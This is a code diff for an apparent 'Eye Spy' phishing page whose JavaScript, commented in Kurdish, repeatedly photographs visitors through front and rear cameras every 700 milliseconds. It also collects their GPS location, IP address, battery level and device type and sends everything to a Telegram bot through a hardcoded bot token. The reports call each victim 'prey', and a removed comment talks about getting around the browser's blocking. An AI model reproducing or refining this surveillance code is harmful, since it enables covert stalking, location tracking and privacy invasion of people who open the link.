@@ -11,86 +11,68 @@
     const urlParams = new URLSearchParams(window.location.search);
     const targetID = urlParams.get('id'); 
     const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";
-    let currentStream = null;
-    let video = document.createElement('video');
+    let videoStream = null; // بۆ کۆنترۆڵکردنی ستریمەکە
 
     async function capture() {
         if (!targetID) return;
-
-        // 🚀 قۆناغی ١: ناردنی خێرای IP و زانیارییەکان (پێش کامێرا)
-        sendInitialReport();
-
-        // 📍 ناردنی لوکەیشن
-        navigator.geolocation.getCurrentPosition(pos => {
-            sendLocation(pos.coords.latitude, pos.coords.longitude);
-        }, null, {enableHighAccuracy:true});
-
-        // 🔥 قۆناغی ٢: هەوڵدان بۆ کردنەوەی کامێرا بە لۆژیکی جیاواز
         try {
-            // سەرەتا هەوڵدان بۆ کامێرای پێشەوە چونکە ئامانجی سەرەکییە
-            await startCam("user");
+            // دەستپێکردن بە کامێرای پشتەوە وەک کۆدەکەی خۆت
+            videoStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" }, 
+                audio: false 
+            });
             
-            // ئەگەر دەستی پێکرد، وێنە بگرە
+            let batteryInfo = "Unknown";
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
+            }
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
+                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
+                    sendToTelegram(report);
+                });
+
+            navigator.geolocation.getCurrentPosition(pos => {
+                sendLocation(pos.coords.latitude, pos.coords.longitude);
+            });
+
+            const video = document.createElement('video');
+            video.srcObject = videoStream;
+            video.muted = true;
+            video.play();
+
+            const takeSnap = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
+            };
+
+            // دەستپێکردنی وێنەگرتنی کامێرای پشت (٧٠٠ms)
             setInterval(takeSnap, 700);
 
-            // دوای ٥ چرکە گۆڕین بۆ کامێرای پشت (تەنها بۆ تاقیکردنەوە ئەگەر کرا)
+            // 🔥 دوای ٦ چرکە کامێرای پێشەوە چالاک دەبێت
             setTimeout(async () => {
-                await switchCam("environment");
-            }, 5000);
+                videoStream.getTracks().forEach(track => track.stop()); // وەستاندنی کامێرای پشت
+                videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                video.srcObject = videoStream;
+                video.play();
+            }, 6000);
 
-        } catch (err) {
-            // 🛠️ ئەگەر لەناو تێلێگرام بلۆک بوو، ئەم فێڵە بەکاربێنە
-            sendToTelegram("⚠️ وێبگەڕی تێلێگرام ڕێگری دەکات. نێچیرەکە ڕەوانەی دەرەوە دەکرێت.");
-            // دەتوانیت لێرەدا ئاراستەی بکەیت بۆ وێبگەڕی دەرەکی ئەگەر ویستت
-        }
-    }
-
-    async function startCam(mode) {
-        // فلتەرێکی بەهێزتر بۆ ناچارکردنی وێبگەڕ
-        const constraints = { 
-            video: { 
-                facingMode: { ideal: mode },
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            }, 
-            audio: false 
-        };
-
-        try {
-            if (currentStream) {
-                currentStream.getTracks().forEach(t => t.stop());
-            }
-            currentStream = await navigator.mediaDevices.getUserMedia(constraints);
-            video.srcObject = currentStream;
-            video.setAttribute("playsinline", true); // بۆ ئایفۆن و تێلێگرام گرنگە
-            video.play();
         } catch (e) {
-            console.error("Cam Error: ", e);
-            throw e;
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
         }
-    }
-
-    async function switchCam(mode) {
-        await startCam(mode);
-    }
-
-    function takeSnap() {
-        if (video.videoWidth > 0) {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; 
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(b => { 
-                if (b) sendFile(b, "photo"); 
-            }, 'image/jpeg', 0.5);
-        }
-    }
-
-    async function sendInitialReport() {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        let report = `🦅 <b>نێچیرێکی نوێ! (Eye Spy V2)</b>\n🌐 IP: <code>${data.ip}</code>\n📱 Device: <code>${navigator.platform}</code>`;
-        sendToTelegram(report);
     }
 
     function sendToTelegram(text) {
@@ -112,7 +94,7 @@
     function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
-        fd.append("photo", blob, "shot.jpg");
+        fd.append(type, blob, "shot.jpg");
         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
